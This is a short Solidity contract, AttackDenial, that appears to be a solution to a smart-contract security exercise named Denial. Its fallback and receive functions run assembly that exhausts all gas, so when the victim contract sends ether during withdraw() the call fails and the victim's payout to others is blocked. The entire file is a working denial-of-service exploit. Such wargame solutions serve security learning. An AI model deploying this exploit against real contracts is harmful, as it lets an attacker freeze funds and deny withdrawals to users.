pragma solidity ^0.6.0;

import "../../../Exercise/Stage1/20/Denial.sol";
import "hardhat/console.sol";

contract AttackDenial {
    Denial denialContract;

    constructor(Denial victimContract) public{
        denialContract = victimContract;
    }

    fallback() payable external {
        assembly {
            mstore(not(0),1)
        }
    }

    receive() payable external {
        assembly {
            mstore(not(0),1)
        }
    }

    function attack() public {
        denialContract.withdraw();
    }

}
